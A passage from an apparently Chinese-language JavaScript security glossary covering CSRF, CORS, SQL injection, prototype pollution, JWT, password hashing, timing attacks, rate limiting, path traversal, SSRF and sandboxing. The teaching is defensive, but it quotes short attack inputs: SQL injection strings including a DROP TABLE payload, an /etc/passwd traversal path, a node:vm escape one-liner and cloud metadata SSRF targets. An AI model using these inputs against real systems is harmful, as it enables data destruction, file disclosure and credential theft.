CSRF 令牌是一个**服务端生成、与当前会话绑定、攻击者无法猜到的随机值**：渲染表单时把它放进隐藏字段（或放进响应头/自定义请求头），提交时服务端比对。它能生效的原因是**同源策略**——攻击者的站点无法读取你页面里的 Token（跨域读取被浏览器禁止），因此虽然能伪造请求，却填不出正确的 Token。关键细节：Token 必须**密码学安全随机**（`Math.random` 可被预测）、**与会话绑定**、**在关键操作（登录、改密、支付）时轮换**；把 Token 放在自定义请求头里（如 `X-CSRF-Token`）比放在表单里更省事且能覆盖 AJAX 请求，但此时必须确保 CORS 配置不会把这个头开放给任意来源。

**常见误解**：以为「Token 放在 Cookie 里就行」。Cookie 会被浏览器自动发送给攻击者伪造的请求，等于没设防——Token 必须在**请求体或自定义头**里，由客户端代码显式从别处取来填入。

也见 [CSRF（跨站请求伪造）](#csrf-cross-site-request-forgery跨站请求伪造)、[SameSite（SameSite Cookie 属性）](#samesitesamesite-cookie-属性)、[Same-Origin Policy / CORS（同源策略与 CORS）](#same-origin-policy-cors同源策略与-cors)。

示例：[`32_security_and_best_practices/11_csrf.js`](32_security_and_best_practices/11_csrf.js)

### Same-Origin Policy / CORS（同源策略与 CORS）

**同源策略**是浏览器的核心安全边界：源由「协议 + 主机 + 端口」三者共同定义，不同源的页面之间**不能读取对方的响应内容**（但可以发出请求）。它正是 XSS 与 CSRF 防御能成立的基石。**CORS** 是一套「服务端显式放行」的机制：当浏览器发现这是一个跨源请求时，会先发预检（`OPTIONS`）询问服务端「允许哪些源、哪些方法、哪些头」，服务端用 `Access-Control-Allow-*` 头回答，通过后才真正发出请求。关键细节：CORS 是**浏览器的限制、由服务端配置解除**，它保护的是用户而不是服务端——因此它**不是**访问控制手段，`curl` 完全无视它；最常见的危险配置是「`Access-Control-Allow-Origin` 回显请求来源」+「`Allow-Credentials: true`」，那等于对所有网站开放了带凭证的接口。

**常见误解**：以为「配了 CORS 才能被访问，所以 CORS 保护了我的 API」。它在服务端不提供任何保护，只影响浏览器是否把响应交给发起方脚本。

也见 [CSRF（跨站请求伪造）](#csrf-cross-site-request-forgery跨站请求伪造)、[XSS（跨站脚本攻击）](#xss-cross-site-scripting跨站脚本攻击)。

示例：[`32_security_and_best_practices/12_cors_and_same_origin.js`](32_security_and_best_practices/12_cors_and_same_origin.js)

### SQL Injection（SQL 注入）

SQL 注入指攻击者**把 SQL 片段伪装成数据送进你的查询里，让数据库把它当成代码执行**——最经典的是 `' OR '1'='1` 绕过登录，或者 `'; DROP TABLE users; --` 直接删库；更隐蔽的用法是通过布尔盲注、时间盲注把整个数据库一点点读出来。它的根源是**字符串拼接**：把用户输入用 `+` 拼进 SQL 文本，数据库就无法区分「哪部分是结构、哪部分是数据」。防御只有一招真正可靠——**参数化查询**（把 SQL 文本和参数分开传给驱动），因为结构在做语法分析时就已经确定，参数永远不可能变成语法。关键细节：服务端校验与转义只能作为补充，因为不同数据库的转义规则、字符集与编码差异（宽字节注入）会让手写转义频繁失守；ORM 的 `where({})` 默认安全，但一旦使用原始查询接口就要重新负起责任。

**常见误解**：以为「转义引号就能防注入」。转义依赖对目标数据库语法与字符集的完美理解，任何一处疏漏都可能被绕过——正确的思路是**结构与数据分离**而不是「把危险字符处理掉」。

也见 [Parameterized Query（参数化查询）](#parameterized-query参数化查询)、[Input Validation（输入校验）](#input-validation输入校验)、[ORM（对象关系映射）](#orm对象关系映射object-relational-mapping)。

示例：[`32_security_and_best_practices/03_sql_injection.js`](32_security_and_best_practices/03_sql_injection.js)

### Parameterized Query（参数化查询）

参数化查询（也叫预处理语句/占位符）把 SQL 拆成**固定的语句模板**与**单独传输的参数**两部分：`db.prepare('SELECT * FROM users WHERE email = ?').get(email)`——数据库先对模板做语法分析与执行计划，然后把参数**当作纯数据绑定进占位符**。由于参数在语法分析阶段根本不存在，用户输入无论包含什么字符都不可能改变查询结构，因此 SQL 注入被彻底消除（而不是被「过滤掉」）。关键细节：这是**唯一被公认为根治手段**的做法，且几乎没有性能代价（还能复用执行计划）；要警惕的是「参数化了值却拼接了标识符」——表名、列名、`ORDER BY` 的方向无法参数化，这些位置必须用**白名单映射**而不是拼接。

**常见误解**：以为 ORM 或存储过程自动安全。ORM 的原始查询接口（`query('... ' + x)`）、存储过程内部拼字符串同样会中招——安全性来自「参数与结构分离」这个做法本身。

也见 [SQL Injection（SQL 注入）](#sql-injectionsql-注入)、[Input Validation（输入校验）](#input-validation输入校验)。

示例：[`32_security_and_best_practices/03_sql_injection.js`](32_security_and_best_practices/03_sql_injection.js)

### Prototype Pollution（原型污染）

原型污染指攻击者**通过 `__proto__`、`constructor.prototype` 这类路径，把属性写进 `Object.prototype`**，从而让「所有对象」都凭空多出一个属性。触发点通常是**不安全的深合并/深拷贝**：递归工具函数逐层复制对象时，遇到键名 `__proto__` 就直接往目标对象的原型上写，于是 `{}['isAdmin']` 变成 `true`，整个应用的逻辑与鉴权判断被诡异地绕过；在服务端还可能被用来改变模板引擎或序列化库的行为，升级成远程代码执行。关键细节：防御手段包括**用 `Object.create(null)` 或 `Map` 存不受信任的键值对**、在合并函数里**跳过 `__proto__`/`constructor`/`prototype` 这三个键**、用 `JSON.parse` 而不是 `eval` 解析、以及冻结 `Object.prototype`（代价是破坏许多库）；在 Node 里还可以用 `--disable-proto=throw`。

**常见误解**：以为「我没写过 `__proto__` 所以与我无关」。漏洞在依赖库的深合并函数里，你只是把它喂给了 `JSON.parse` 出来的对象——这也是它长期位居 OWASP 关注列表的原因。

也见 [Immutability（不可变数据）](#immutability不可变数据)、[Input Validation（输入校验）](#input-validation输入校验)、[Supply Chain Attack（供应链攻击）](#supply-chain-attack供应链攻击)。

示例：[`32_security_and_best_practices/04_prototype_pollution.js`](32_security_and_best_practices/04_prototype_pollution.js)

### Typosquatting / Dependency Confusion（仿冒包名与依赖混淆）

两者都是**针对包管理器的供应链攻击手法**。**Typosquatting（仿冒抢注）**利用人的拼写疏忽：注册 `lodahs`、`axois`、`cross-env-v2` 这类与知名包极像的名字，一旦有人 `npm install` 打错字就把恶意代码装进了项目。**Dependency Confusion（依赖混淆）**则利用**包名解析优先级**：如果贵公司内部有一个私有包 `@company/utils`（或未加作用域的 `internal-utils`），而攻击者在公共仓库注册一个**同名且版本号更高**的包，配置不当的安装流程可能会优先拉取公共仓库的那个版本，从而在构建机与生产环境执行攻击者的代码。关键细节：防御手段是内部包**统一加作用域**（`@company/`）、在 `.npmrc` 中显式绑定私有源的包范围、锁定精确版本 + 使用锁文件、并对新增依赖做代码评审。

**常见误解**：以为「只装 star 多的包就没事」。依赖混淆攻击的目标恰恰是你**自己团队**的包名，与流行度无关。

也见 [Supply Chain Attack（供应链攻击）](#supply-chain-attack供应链攻击)、[Lockfile（锁文件）](#lockfile锁文件)、[SRI（子资源完整性）](#sri-subresource-integrity子资源完整性)。

示例：[`32_security_and_best_practices/14_supply_chain_security.js`](32_security_and_best_practices/14_supply_chain_security.js)

### SRI — Subresource Integrity（子资源完整性）

SRI 是给 `<script>`、`<link>` 等标签加上 `integrity="sha384-..."` 属性，让浏览器在**执行前先校验下载到的文件哈希**是否与页面里写死的一致；不一致就拒绝执行。它防的是**第三方 CDN 被入侵或文件被替换**——CDN 的域名是白名单里的，CSP 拦不住它，但哈希对不上浏览器就会拦住。关键细节：SRI 要求资源**同源或允许跨域（`crossorigin` 属性 + CORS 头）**，否则浏览器无法读取内容做校验；哈希必须在文件内容更新时同步更新（因此构建流程要自动生成而非手写）；现代实践中，把关键依赖**打包进自己的产物**（自托管）往往比依赖第三方 CDN + SRI 更简单可靠。

**常见误解**：以为「有 SRI 就万事大吉」。它只校验**静态文件的完整性**，如果 CDN 上的文件本身就被官方发布了恶意版本（供应链攻击），哈希与恶意内容一致，SRI 帮不上忙。

也见 [CSP（内容安全策略）](#csp-content-security-policy内容安全策略)、[Supply Chain Attack（供应链攻击）](#supply-chain-attack供应链攻击)。

示例：[`32_security_and_best_practices/14_supply_chain_security.js`](32_security_and_best_practices/14_supply_chain_security.js)

### Authentication vs Authorization（认证与授权）

**认证（Authentication）**回答「**你是谁**」：核对用户名密码、验证令牌签名、完成 OAuth 登录。**授权（Authorization）**回答「**你能做什么**」：这个用户能不能查看这条订单、能不能删除这个资源。两者常被缩写为 AuthN 与 AuthZ，也因此被大量混用。为什么要严格区分？因为它们**失败的后果与修复位置完全不同**：认证失败应当是 401 Unauthorized（并提示去登录），授权失败应当是 403 Forbidden（身份有效但无权限）；如果混淆，客户端就无法判断该跳登录页还是该提示无权限。更关键的是，绝大多数越权漏洞（IDOR：把 URL 里的 `orderId` 改成别人的）都属于**授权缺失**——代码确实验明了身份，却忘了检查「这条数据是不是他的」。

**常见误解**：以为「登录了就有权限」。认证成功只是拿到了身份，每一个涉及资源的操作都必须独立做授权判断——按「先认证整个应用，再对每个对象做授权」的顺序思考，是避免越权的关键。

也见 [Session（会话）](#session会话)、[JWT（JSON Web Token）](#jwt-json-web-tokenjson-web-token)、[Principle of Least Privilege（最小权限原则）](#principle-of-least-privilege最小权限原则)。

示例：[`32_security_and_best_practices/15_auth_basics.js`](32_security_and_best_practices/15_auth_basics.js)

### Session（会话）

会话是**服务端在用户登录后建立的一段有状态身份记录**：生成一个随机的 Session ID 发给浏览器（通常存在 `HttpOnly` Cookie 里），服务端保存这张 ID 到用户信息与过期时间的映射，之后每个请求靠 Session ID 认出「你是谁」。它的优点是**服务端可撤销**——封禁、登出、改密码后立刻失效，敏感信息留在服务端不暴露给客户端。关键细节：Session ID 必须**密码学安全随机、足够长**，并且登录成功后应当**重新生成**（防会话固定攻击：攻击者先给受害者一个已知的 Session ID，受害者登录后该 ID 就成了已认证会话）；Cookie 要设置 `HttpOnly`（JS 读不到，防 XSS 窃取）、`Secure`（只走 HTTPS）、`SameSite`（防 CSRF），并有过期与闲置超时。

**常见误解**：以为「Session ID 放在 Cookie 里就等于把状态放客户端」。状态在服务端，Cookie 里只是那串不透明的查找键。

也见 [JWT（JSON Web Token）](#jwt-json-web-tokenjson-web-token)、[Authentication vs Authorization（认证与授权）](#authentication-vs-authorization认证与授权)、[CSRF（跨站请求伪造）](#csrf-cross-site-request-forgery跨站请求伪造)。

示例：[`32_security_and_best_practices/15_auth_basics.js`](32_security_and_best_practices/15_auth_basics.js)

### JWT — JSON Web Token（JSON Web Token）

JWT 是一段自包含的凭证，由三部分用点号连接：**头部**（算法）、**载荷**（声明，如 `sub`、`exp`、`role`）、**签名**（用密钥对前两段签名）。服务端凭签名就能验证「这段内容确实是我签发的且没被篡改」，因此**无需查库**即可完成认证，很适合分布式与无状态场景。关键细节：JWT 的载荷**只是 Base64URL 编码、不是加密**——任何人都能解开看到内容，所以绝不能放敏感信息；它**天然不可撤销**（签发后在过期前一直有效），因此必须设置较短的 `exp` 并配合刷新令牌；最著名的实现漏洞是**算法混淆攻击**（服务端信任头部声明的 `alg`，攻击者改成 `none` 或把 RS256 换成 HS256 用公钥当 HMAC 密钥）——服务端必须**写死自己期望的算法**，绝不信任头部。另外 JWT 不解决 CSRF：若存在 Cookie 里，仍然需要 CSRF 防护。

**常见误解**：以为「JWT 比 Session 更安全」或「JWT 能替代 Session」。它换来的是无状态与跨服务便利，代价是不可撤销与令牌管理复杂度，两者是权衡而非升级关系。

也见 [Session（会话）](#session会话)、[Authentication vs Authorization（认证与授权）](#authentication-vs-authorization认证与授权)、[Timing Attack（时序攻击）](#timing-attack时序攻击)。

示例：[`32_security_and_best_practices/15_auth_basics.js`](32_security_and_best_practices/15_auth_basics.js)

### Password Hashing（密码哈希）

密码绝不能以明文或可逆加密存储，而应存**单向哈希**：登录时把用户输入的密码同样哈希后与库里的值比对。为什么不能用 MD5/SHA-256 这类通用哈希？因为它们**太快了**——现代 GPU 每秒可以计算上百亿次 SHA-256，泄露的哈希库可以在数小时内被穷举破解。正确选择是**专门的密码哈希函数**（bcrypt、scrypt、argon2、PBKDF2），它们通过「可调的计算成本」把每次验证拉长到几十到几百毫秒，让离线暴力破解在经济上不可行；argon2 还额外抗 GPU/ASIC（内存硬），是当前的首选。关键细节：成本参数要**随硬件进步定期调高**（参数可以存在哈希串里，因此不同用户可以有不同参数）；哈希算法要留升级路径（登录成功后按需重新哈希）；并且**永远不要自己实现密码哈希算法**。

**常见误解**：以为「加了盐的 SHA-256 就够安全」。盐只防彩虹表与「相同密码产生相同哈希」，完全不能阻止高速穷举——慢哈希才是关键，盐是它自带的配套。

也见 [Salt（加盐）](#salt加盐)、[Slow Hash（慢哈希）](#slow-hash慢哈希bcrypt-argon2-scrypt)、[Timing Attack（时序攻击）](#timing-attack时序攻击)。

示例：[`32_security_and_best_practices/15_auth_basics.js`](32_security_and_best_practices/15_auth_basics.js)

### Salt（加盐）

盐是**为每个密码单独生成的随机值**，与密码一起参与哈希并被一同存储。它解决两个问题：**彩虹表**（预计算的海量「常见密码 → 哈希」对照表）失效，因为同一个密码配上不同的盐会得到完全不同的哈希；以及**批量破解效率**（不加盐时，攻击者可以一次算出一个哈希就同时命中所有用该密码的账号；加盐后每个账号都要单独算）。关键细节：盐必须是**密码学安全的随机数、全局唯一、足够长**（通常 16 字节以上），并且**不需要保密**（它就和哈希存在一起）；盐是「每密码唯一」而不是「全局共享」——用一个固定盐只能防彩虹表、防不住批量破解。现代密码哈希函数（bcrypt/argon2）会**自动生成并内嵌盐**，因此通常不需要手工管理。

**常见误解**：以为盐能防住暴力破解或让弱密码变安全。盐只增加攻击者的**摊销成本**，`123456` 加任何盐都还是弱密码；抗暴力破解靠的是「慢」和「限流」。

也见 [Password Hashing（密码哈希）](#password-hashing密码哈希)、[Slow Hash（慢哈希）](#slow-hash慢哈希bcrypt-argon2-scrypt)、[Rate Limiting（速率限制）](#rate-limiting速率限制)。

示例：[`32_security_and_best_practices/15_auth_basics.js`](32_security_and_best_practices/15_auth_basics.js)

### Slow Hash（慢哈希，bcrypt / argon2 / scrypt）

慢哈希是一类**故意设计成计算昂贵**的密码哈希函数，代表实现有 bcrypt、scrypt、argon2（以及 PBKDF2）。它们的共同点是提供一个**成本参数**（bcrypt 的轮数因子、argon2 的内存/时间/并行度），让「算一次」的耗时可控地拉长到 50~500 毫秒——对真实登录来说完全可接受（用户一年也就登录几百次），但对攻击者来说，每一次猜测的成本被乘以同样的倍数，穷举从「小时级」变成「天文数字级」。三者的差异：bcrypt 成熟稳定、结果长度固定（有 72 字节输入上限，超长密码需要先做预处理）；scrypt 与 argon2 是**内存硬**的，需要大量内存才能计算，因此对 GPU/ASIC 并行破解的抵抗力更强，argon2id 目前是最推荐的默认选择。关键细节：参数选择要**以本地实测耗时为准**（比如目标 250ms），并随硬件升级而调高。

**常见误解**：以为「慢哈希会拖慢登录所以不好」。拖慢的正是攻击者最需要的东西，而合法的登录请求配合**限流**后完全不受影响。

也见 [Password Hashing（密码哈希）](#password-hashing密码哈希)、[Salt（加盐）](#salt加盐)、[Rate Limiting（速率限制）](#rate-limiting速率限制)。

示例：[`32_security_and_best_practices/15_auth_basics.js`](32_security_and_best_practices/15_auth_basics.js)

### Timing Attack（时序攻击）

时序攻击是一种**旁路攻击**：攻击者不破解算法，而是通过测量**响应时间的细微差异**反推秘密信息。最经典的例子是字符串比较——`if (input === secret)` 在第一个字符不匹配时就立刻返回，而在前若干字符都匹配时会更慢地走到下一轮，因此攻击者可以逐字节地试出正确的值（比如重置密码的令牌、API Key）。同理，用户名不存在时立即返回、存在时才开始做密码哈希，会泄漏「哪些用户名是有效的」。关键细节：防御手段是**常量时间比较**（无论内容如何都比完全部字节）、对不存在的账号也执行一遍「假哈希」让两条路径耗时一致、以及为敏感操作加入随机延迟作为补充；要注意 JS 里 `===` 对字符串的比较、`Array.prototype.includes` 等都是短路语义，不能用于秘密比较。

**常见误解**：以为「网络抖动那么大，时序差异根本测不出来」。攻击者可以发送成千上万次请求取统计分布，毫秒甚至微秒级的系统性差异在足够样本下非常显著。

也见 [Constant-Time Comparison（常量时间比较）](#constant-time-comparison常量时间比较)、[Secure Random（安全随机数）](#secure-random安全随机数)、[Password Hashing（密码哈希）](#password-hashing密码哈希)。

示例：[`32_security_and_best_practices/09_secure_random.js`](32_security_and_best_practices/09_secure_random.js)

### Constant-Time Comparison（常量时间比较）

常量时间比较指**比较两个值时不提前返回、不做数据相关的分支**，而是遍历全部字节并把差异累积起来，最后一次性判断，使耗时与「匹配了多少前缀」无关。它是抵御时序攻击的直接手段，用于所有涉及秘密的比较（会话令牌、重置令牌、API Key、HMAC 签名）。关键细节：JS 里的 `===`、`localeCompare`、`Buffer.compare` 都是短路的，不能用于秘密；Node 提供了 `crypto.timingSafeEqual(a, b)` 专门做这件事（要求两个 Buffer **长度相同**，否则会抛错——而「先比长度」本身也是泄漏，通常做法是先哈希到固定长度再比较）；由于 JS 引擎的 JIT 与垃圾回收会引入噪声，严格意义上这里只是「**尽可能**常量时间」，因此绝不能把它当成唯一防线。

**常见误解**：以为「我先检查长度再比较内容就够了」。长度检查本身泄漏了长度信息，同时也让两条分支的耗时不同。

也见 [Timing Attack（时序攻击）](#timing-attack时序攻击)、[Secure Random（安全随机数）](#secure-random安全随机数)。

示例：[`32_security_and_best_practices/09_secure_random.js`](32_security_and_best_practices/09_secure_random.js)

### Secure Random（安全随机数）

安全随机数指**密码学安全伪随机数生成器（CSPRNG）**产出的随机值，其输出不可预测、不可从历史输出反推下一次结果。JS 里必须使用 `crypto.getRandomValues()`（浏览器/Web Crypto）或 `crypto.randomBytes()`/`crypto.randomUUID()`（Node），**绝不能用 `Math.random()`**——后者的实现是可预测的（种子可从少量输出反推），用它生成会话 ID、重置令牌、CSRF nonce 等于把系统敞开。关键细节：还有个隐蔽的坑是**取模偏差**：`randomValue % max` 会让某些值出现得略多（除非 `max` 能整除随机数空间），需要做**拒绝采样**（落在超出区间时重取）来消除偏向；此外随机值要**足够长**（会话 ID 通常至少 128 位）以抵抗穷举。

**常见误解**：以为「`Math.random()` 看起来够随机了」。安全的判据不是「像不像随机」而是「攻击者能否预测」，而 `Math.random` 的答案是能。

也见 [Timing Attack（时序攻击）](#timing-attack时序攻击)、[Nonce（一次性随机数）](#nonce一次性随机数)、[Constant-Time Comparison（常量时间比较）](#constant-time-comparison常量时间比较)。

示例：[`32_security_and_best_practices/09_secure_random.js`](32_security_and_best_practices/09_secure_random.js)

### Rate Limiting（速率限制）

速率限制是**在单位时间内限制某个主体能发起的请求数量**，超限返回 429 Too Many Requests 并通常附带 `Retry-After`。它有三重作用：**防暴力破解**（把「每秒猜一万个密码」压到「每分钟 5 次」）、**防资源滥用与爬虫**（保护成本敏感的下游）、以及**保证公平性**（防止单个客户端挤占所有容量）。关键细节：限流的**维度**比算法更重要——按 IP、按账号、按 API Key、按接口路径，不同维度防的是不同攻击（按 IP 挡不住分布式攻击，按账号挡不住撞库时的账号喷洒，因此常需要多维度组合）；被限流时的响应要区分对待（对攻击者要静默拒绝并记录，对正常用户要给出友好提示），并且要注意**别把限流做成拒绝服务**：按 IP 限流时，大量用户共享出口 IP（公司网络、运营商 NAT）会被整片误伤。

**常见误解**：以为「限流能防住分布式暴力破解」。攻击者用海量 IP 时，单 IP 阈值毫无作用——此时必须叠加「按账号锁定 + 指数退避 + 异常行为检测」。

也见 [Token Bucket / Leaky Bucket（令牌桶与漏桶）](#token-bucket-leaky-bucket令牌桶与漏桶)、[Brute Force Protection（暴力破解防护）](#brute-force-protection暴力破解防护)、[Slow Hash（慢哈希）](#slow-hash慢哈希bcrypt-argon2-scrypt)。

示例：[`32_security_and_best_practices/16_rate_limiting.js`](32_security_and_best_practices/16_rate_limiting.js)

### Token Bucket / Leaky Bucket（令牌桶与漏桶）

这是两种最常用的限流算法。**令牌桶**按固定速率往桶里放令牌，请求到来时拿走一个令牌，拿不到就限流；桶有容量上限，因此允许**一定量的突发**（桶里攒了 10 个令牌，就能瞬间放行 10 个请求）。**漏桶**把请求先放进队列，再以**恒定速率**流出，超出队列容量就丢弃——它把流量整形成绝对平滑的输出，不允许突发。选择依据是业务需不需要突发：绝大多数 API 用令牌桶（用户偶尔连点几下是正常的），而对下游有严格平稳要求的场景用漏桶。还有一种常用的**固定窗口计数**（每分钟清零），实现最简单但存在「窗口边界双倍流量」的缺陷（59 秒发 100 次、1 分 00 秒再发 100 次），**滑动窗口**可以修复它。

**常见误解**：以为「记录每个 IP 的请求次数」就是限流。简单的固定窗口计数在窗口边界处会放行两倍流量，需要滑动窗口才能得到真实速率。

也见 [Rate Limiting（速率限制）](#rate-limiting速率限制)、[Circuit Breaker（熔断器）](#circuit-breaker熔断器)、[Retry（重试）](#retry重试)。

示例：[`32_security_and_best_practices/16_rate_limiting.js`](32_security_and_best_practices/16_rate_limiting.js)

### Brute Force Protection（暴力破解防护）

暴力破解指攻击者**用大量候选值反复尝试**——猜密码、猜验证码、猜重置令牌、猜用户 ID。防护必须是**多层叠加**的，因为任何单层都有绕过方式：**限流**（按 IP 与按账号双维度）、**指数锁定**（连续失败后延迟逐步拉长甚至临时锁定账号）、**慢哈希**（让每次尝试本身就很贵，把在线爆破的成本提高几个数量级）、**验证码/人机校验**（在阈值后触发）、**强密码策略与泄露密码库比对**（从源头减少可猜中的密码）、以及**对失败的响应做统一化**（不区分「用户不存在」与「密码错误」，不泄漏账号是否存在）。关键细节：账号锁定机制本身可被武器化——攻击者故意用错误密码反复尝试某个已知用户名，就能把他锁在门外（账号锁定 DoS），因此更稳妥的做法是**指数退避 + 记录异常 + 触发二次验证**，而不是简单硬锁。

**常见误解**：以为「密码够复杂就不会被爆破」。撞库用的不是随机猜测，而是从其它站点泄露的真实「邮箱 + 密码」组合——防御重点在于**检测异常登录模式**与**限制尝试速率**。

也见 [Rate Limiting（速率限制）](#rate-limiting速率限制)、[Slow Hash（慢哈希）](#slow-hash慢哈希bcrypt-argon2-scrypt)、[Authentication vs Authorization（认证与授权）](#authentication-vs-authorization认证与授权)。

示例：[`32_security_and_best_practices/16_rate_limiting.js`](32_security_and_best_practices/16_rate_limiting.js)

### Path Traversal（路径遍历）

路径遍历（也叫目录穿越）指攻击者**在文件路径参数里塞进 `../` 之类的序列，跳出你预期的目录去读取或写入任意文件**：`GET /files?name=../../../etc/passwd`。它出现的原因是「把用户输入直接拼进文件路径」，而路径里的 `..` 具有语义。防御的核心手段是**规范化后校验**：把拼好的路径用 `path.resolve()` 解析成绝对路径（消除所有 `..`），再检查它是否**以允许的基准目录开头**（注意要比较带分隔符的完整片段，否则 `/data/allowed-evil` 会通过 `/data/allowed` 的前缀检查）。关键细节：只过滤 `../` 字符串是黑名单思维，会被 URL 编码（`%2e%2e%2f`）、双重编码、绝对路径、Windows 的反斜杠与短文件名（`8.3` 格式）、以及符号链接绕过；更彻底的做法是**不直接用用户输入做路径**（改用 ID 到路径的映射表），或者用 `path.basename()` 只取文件名丢弃目录部分。

**常见误解**：以为「把 `/` 过滤掉就安全了」。编码、反斜杠、绝对路径都是绕过路径，安全来自**规范化 + 白名单前缀校验**而不是字符过滤。

也见 [SSRF（服务端请求伪造）](#ssrf-server-side-request-forgery服务端请求伪造)、[Input Validation（输入校验）](#input-validation输入校验)。

示例：[`32_security_and_best_practices/17_path_traversal_and_ssrf.js`](32_security_and_best_practices/17_path_traversal_and_ssrf.js)

### SSRF — Server-Side Request Forgery（服务端请求伪造）

SSRF 指攻击者**诱使你的服务器去请求一个他指定的地址**，从而借服务器之手访问他够不到的网络位置。危害在于服务器的网络位置通常比攻击者好得多——它可以访问**内网服务**（`http://10.0.0.5/admin`）、**云元数据接口**（`http://169.254.169.254/` 可以拿到临时凭证，一次拿下整个云账号）、以及 localhost 上只监听本机的管理端口。触发点是任何「由用户提供 URL」的功能：图片抓取、Webhook、URL 预览、PDF 生成、代理。防御手段包括：**协议白名单**（只允许 http/https，挡掉 `file://`、`gopher://`、`dict://`）、**解析后校验目标 IP 并拒绝私有/环回/链路本地地址段**、**禁止跟随重定向**（重定向是绕过前置校验的经典手段）、**独立的出网出口并限制可达范围**、以及对响应做大小与超时限制。关键细节：域名 → IP 的解析存在 **DNS rebinding**（校验时解析到公网 IP、真正请求时解析到内网），因此必须**校验最终连接的 IP** 而不是只校验域名。

**常见误解**：以为「只允许 http/https 就没问题」。只要目标地址可以是内网，攻击者就能用合法协议打到内部服务；协议白名单只是第一层。

也见 [Path Traversal（路径遍历）](#path-traversal路径遍历)、[Input Validation（输入校验）](#input-validation输入校验)、[Principle of Least Privilege（最小权限原则）](#principle-of-least-privilege最小权限原则)。

示例：[`32_security_and_best_practices/17_path_traversal_and_ssrf.js`](32_security_and_best_practices/17_path_traversal_and_ssrf.js)

### Sandboxing（沙箱）

沙箱是**在一个受限环境中执行不受信任的代码**，限制它能触碰的资源（文件、网络、进程、内存）以便即使它心怀恶意也造不成大破坏。它不是「一层 API」而是**隔离层级的连续谱**：从最弱到最强大致是「语言级限制（无 `eval` 的受限解释器、`node:vm`）→ 独立进程 + 权限限制（seccomp/容器/低权限用户）→ 虚拟机 → 独立物理机」。关键细节：选择哪一档取决于**代码的敌意程度**——自己人写的、可能出 bug 的插件代码可以用轻量隔离；完全来自互联网的代码必须用进程或虚拟机级隔离并配资源限额；此外沙箱必须同时限制**时间**（超时终止死循环）、**内存**（防止 OOM）与**输出**（防止刷爆日志）。

**常见误解**：以为「在主进程里跑不可信代码 + 加几个检查」就安全了。隔离强度取决于**最外层的边界**，进程内的任何「检查」都能被绕过。

也见 [node:vm 的局限](#nodevm-的局限limitations-of-nodevm)、[Principle of Least Privilege（最小权限原则）](#principle-of-least-privilege最小权限原则)。

示例：[`32_security_and_best_practices/18_sandboxing.js`](32_security_and_best_practices/18_sandboxing.js)

### node:vm 的局限（Limitations of node:vm）

`node:vm` 可以把一段字符串当代码在一个**独立的上下文**里执行（`vm.runInNewContext`），看起来像沙箱，但 Node 官方文档明确写着「**它不是安全机制**」。原因很实际：它只隔离了「全局变量」这一层，逃逸手段却很多——传入上下文的对象（哪怕只是一个普通对象）可以被拿去访问它的 `constructor`，进而拿到宿主的 `Function`，再执行任意代码；`this.constructor.constructor('return process')()` 这类一行代码就能突破；即使只传原始值，也仍有原型链与异常对象带来的泄漏路径。因此 `node:vm` 的正确用途是**执行自己信任但需要隔离状态的代码**（模板、配置求值、测试夹具），而不是执行用户的代码。真正的沙箱需要**进程级隔离**（`child_process` + 资源限制 + 降权）、容器、或专用沙箱服务。

**常见误解**：以为「用 `vm` 加上删除 `process`/`require` 就安全了」。逃逸靠的是**运行时对象图的可达性**，删除几个显眼的名字完全不足以封住它。

也见 [Sandboxing（沙箱）](#sandboxing沙箱)、[Defense in Depth（纵深防御）](#defense-in-depth纵深防御)、[Principle of Least Privilege（最小权限原则）](#principle-of-least-privilege最小权限原则)。

示例：[`32_security_and_best_practices/18_sandboxing.js`](32_security_and_best_practices/18_sandboxing.js)

### OWASP Top 10（OWASP 十大安全风险）

OWASP Top 10 是 OWASP 组织发布的**最严重的 Web 应用安全风险清单**，每几年更新一次，用于把「该优先修什么」在全行业对齐。近年上榜的典型条目包括：失效的访问控制（越权）、加密机制失效、注入（含 XSS 与 SQL 注入）、不安全设计、安全配置错误、使用含有已知漏洞的组件、身份认证与鉴权失效、软件与数据完整性失效（供应链）、安全日志与监控失效、以及 SSRF。关键细节：它是一份**认知清单而不是合规标准**——榜单排名反映的是「普遍程度 × 危害 × 可检测性」的综合，不是「你的系统一定按这个顺序有问题」；使用方法应当是对照它做一次自查，再结合自己的威胁模型确定优先级；此外还有配套的 ASVS（应用安全验证标准）适合需要具体可测条款的场景。

**常见误解**：以为「通过了 OWASP Top 10 检查就安全了」。它覆盖的是**常见风险类别**，且清单本身不检查你的具体业务逻辑漏洞（比如业务层面的越权、刷单、价格篡改）。

也见 [Threat Model（威胁模型）](#threat-model威胁模型)、[Defense in Depth（纵深防御）](#defense-in-depth纵深防御)、[Principle of Least Privilege（最小权限原则）](#principle-of-least-privilege最小权限原则)。

示例：[`32_security_and_best_practices/19_owasp_checklist.js`](32_security_and_best_practices/19_owasp_checklist.js)

### Principle of Least Privilege（最小权限原则）

最小权限原则要求**每个主体（用户、服务、进程、令牌）只被授予完成其任务所必需的最小权限，且只在该任务需要的时间内持有**。它承认「任何防线都可能被突破」，因此把目标从「绝不失守」调整为「失守之后能坏多少」——一个只读数据库账号被盗，损失远小于一个拥有 `DROP` 权限的账号。落地方式很具体：数据库账号按服务拆分权限、容器里用非 root 用户运行、云上给实例绑定最小策略的 IAM 角色、API Token 限定作用域（scope）与来源、后台管理界面与前台业务分离、以及避免长期有效的凭证（优先用短期令牌）。关键细节：它与**纵深防御**是一对搭档——最小权限限制「一个点失守」的爆炸半径，纵深防御延缓「突破下一个点」的速度。

**常见误解**：以为「内部服务之间没必要限制」。攻击者一旦进入内网，横向移动（lateral movement）能力完全取决于每个节点的权限大小，内部无限制正是重大事故的放大器。

也见 [Defense in Depth（纵深防御）](#defense-in-depth纵深防御)、[Authentication vs Authorization（认证与授权）](#authentication-vs-authorization认证与授权)、[SSRF（服务端请求伪造）](#ssrf-server-side-request-forgery服务端请求伪造)。

示例：[`32_security_and_best_practices/19_owasp_checklist.js`](32_security_and_best_practices/19_owasp_checklist.js)

### Defense in Depth（纵深防御）

纵深防御主张**用相互独立的多层防线保护同一资产**，使得任何单层的失误或绕过都不足以造成完整失陷。它基于一个务实的假设：**任何一层都会失效**——WAF 有规则盲区、转义有上下文遗漏、密码有人为弱口令、员工有被钓鱼的可能。在 XSS 场景里的典型分层是：输入校验（限制形状）→ 上下文转义（消除注入）→ CSP（拦截漏网脚本）→ Trusted Types（从 API 层面禁掉危险写入）→ `HttpOnly` Cookie（即使脚本执行了也偷不走会话）→ 监控上报（发现攻击尝试）。关键细节：「独立」是这个原则的关键——如果两层依赖同一个假设（比如都依赖「用户输入里不含 `<`」），那本质上仍然只有一层。

